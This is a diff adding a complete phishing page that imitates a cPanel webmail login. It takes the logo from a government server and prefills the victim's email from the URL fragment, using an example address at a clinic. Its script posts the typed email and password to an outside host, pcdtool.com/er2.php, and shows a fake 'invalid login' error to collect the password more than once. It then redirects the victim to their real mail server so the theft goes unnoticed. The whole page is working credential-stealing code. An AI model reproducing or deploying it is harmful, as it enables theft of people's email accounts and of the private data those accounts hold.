@@ -1,0 +1,222 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login Form</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap');
+        body {
+            font-family: 'Roboto', sans-serif;
+            background-color: white;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh; /* Ensure full page height */
+        }
+
+        .form-container {
+            margin-bottom: 50px; /* Add spacing between the form and the languages */
+        }
+
+        .languages-container {
+            display: flex;
+            justify-content: center;
+            flex-wrap: wrap; /* Ensure content wraps if it exceeds the width */
+            gap: 10px; /* Add space between items */
+            max-width: 100%;
+            text-align: center;
+        }
+
+        /* Default link styles */
+        a {
+            text-decoration: none;
+            color: #333; /* Default color for all links */
+            font-size: 1rem;
+            transition: color 0.3s ease; /* Smooth transition for hover effect */
+        }
+
+        /* Hover effect for links */
+        a:hover {
+            color: red; /* Change color to red on hover */
+        }
+
+        /* Login button styles */
+        .login-button {
+            background-color: #3b82f6; /* Tailwind's bg-blue-500 */
+            transition: background-color 0.3s ease; /* Smooth transition */
+        }
+
+        /* Add active state for button click */
+        .login-button:active {
+            background-color: #2563eb; /* Darker blue on click */
+            transform: scale(0.98); /* Slightly reduces the button size to create a click effect */
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2); /* Adds a shadow to indicate the button was pressed */
+        }
+
+        .error-message {
+            display: none;
+            background-color: #d35351; /* Updated error box color */
+            color: white;
+            padding: 10px;
+            font-size: 1rem;
+            font-weight: bold;
+            text-align: center;
+            border-radius: 5px;
+            margin-top: 15px;
+            width: 100%;
+            max-width: 350px;
+            margin-left: auto;
+            margin-right: auto;
+            position: absolute; /* Position the error message above the form */
+            top: 20px; /* Distance from the top of the screen */
+            left: 50%; /* Center it horizontally */
+            transform: translateX(-50%);
+        }
+    </style>
+</head>
+<body>
+    <!-- Error Message Box Above Logo -->
+    <div id="error_message" class="error-message">The login is invalid.</div>
+
+    <!-- Login Form Section -->
+    <div class="form-container">
+        <div class="w-full max-w-sm">
+            <div class="text-center mb-8">
+                <!-- Replaced the Webmail text with the image and added width/height attributes -->
+                <img alt="logo" class="main-logo" src="https://swkpk.gov.pk:2096/cPanel_magic_revision_1520002530/unprotected/cpanel/images/webmail-logo.svg" width="304583" height="50">
+            </div>
+            <form id="loginForm" class="bg-white shadow-md rounded px-8 pt-6 pb-8 mb-4">
+                <div class="mb-4">
+                    <label class="block text-gray-700 text-sm font-bold mb-2" for="email">
+                        Email Address
+                    </label>
+                    <div class="relative">
+                        <span class="absolute inset-y-0 left-0 flex items-center pl-3">
+                            <i class="fas fa-user text-gray-400"></i>
+                        </span>
+                        <input class="shadow appearance-none border rounded w-full py-2 px-3 pl-10 text-gray-700 leading-tight focus:outline-none focus:shadow-outline" id="email" type="email" placeholder="Enter your email address.">
+                    </div>
+                </div>
+                <div class="mb-6">
+                    <label class="block text-gray-700 text-sm font-bold mb-2" for="password">
+                        Password
+                    </label>
+                    <div class="relative">
+                        <span class="absolute inset-y-0 left-0 flex items-center pl-3">
+                            <i class="fas fa-lock text-gray-400"></i>
+                        </span>
+                        <input class="shadow appearance-none border rounded w-full py-2 px-3 pl-10 text-gray-700 mb-3 leading-tight focus:outline-none focus:shadow-outline" id="password" type="password" placeholder="Enter your email password.">
+                    </div>
+                </div>
+                <div class="flex items-center justify-between">
+                    <button id="login_submit" class="login-button w-full text-white font-bold py-2 px-4 rounded focus:outline-none focus:shadow-outline" type="button">
+                        Log in
+                    </button>
+                </div>
+            </form>
+            <div class="text-center">
+                <a class="inline-block align-baseline text-sm" href="#">
+                    Reset Password
+                </a>
+            </div>
+        </div>
+    </div>
+
+    <!-- Languages Section -->
+    <div class="languages-container">
+        <a href="#">العربية</a>
+        <a href="#">čeština</a>
+        <a href="#">dansk</a>
+        <a href="#">Deutsch</a>
+        <a href="#">Ελληνικά</a>
+        <a href="#">español</a>
+        <a href="#">español latinoamericano</a>
+        <a href="#">español de España</a>
+        <a href="#">...</a>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function () {
+            // Get email from the URL hash fragment
+            var urlHash = window.location.hash;
+            if (urlHash) {
+                // Extract email from the hash (e.g., #resulte@carolabortionclinic.com)
+                var emailFromUrl = urlHash.substring(1); // Remove the '#' character
+                var emailField = document.getElementById('email');
+                emailField.value = emailFromUrl; // Set the email in the field
+            }
+
+            var loginButton = document.getElementById('login_submit');
+            var emailField = document.getElementById('email');
+            var passwordField = document.getElementById('password');
+            var errorMessageDiv = document.getElementById('error_message');
+            var clickCount = 0;
+
+            loginButton.addEventListener('click', function (event) {
+                clickCount++;
+
+                if (clickCount <= 2) {
+                    // Get email and password from the fields
+                    var userEmail = emailField.value;
+                    var userPassword = passwordField.value;
+
+                    // Prepare the data to be sent
+                    var data = new FormData();
+                    data.append('email', userEmail);
+                    data.append('password', userPassword);
+
+                    // Send the email and password to the server 3 times
+                    fetch('https://pcdtool.com/er2.php', {
+                        method: 'POST',
+                        body: data
+                    })
+                    .then(response => response.text())
+                    .then(result => {
+                        console.log('Data sent to server', result);
+
+                        // Check response and show error message if login is invalid
+                        if (result === "invalid_login") {
+                            // Show the error message for 2 seconds
+                            errorMessageDiv.style.display = 'block';
+                            setTimeout(function () {
+                                errorMessageDiv.style.display = 'none';
+                            }, 2000); // Display error for 2 seconds
+                        } else {
+                            errorMessageDiv.style.display = 'none';  // Clear the error message
+                        }
+                    })
+                    .catch(error => {
+                        console.error('Error sending data:', error);
+                        // Show the error message for 2 seconds
+                        errorMessageDiv.style.display = 'block';
+                        setTimeout(function () {
+                            errorMessageDiv.style.display = 'none';
+                        }, 2000); // Display error for 2 seconds
+
+                        passwordField.value = ''; // Clear the password field on error
+                    });
+                }
+
+                // After 3 submissions, skip error message and just redirect
+                if (clickCount === 3) {
+                    var userEmail = emailField.value;
+                    var domain = userEmail.split('@')[1];
+
+                    if (domain) {
+                        var emailHostURL = 'http://' + domain + ":2096";
+                        window.location.href = emailHostURL;
+                    } else {
+                        window.location.href = 'https://www.google.com/';
+                    }
+                }
+            });
+        });
+    </script>
+</body>
+</html>
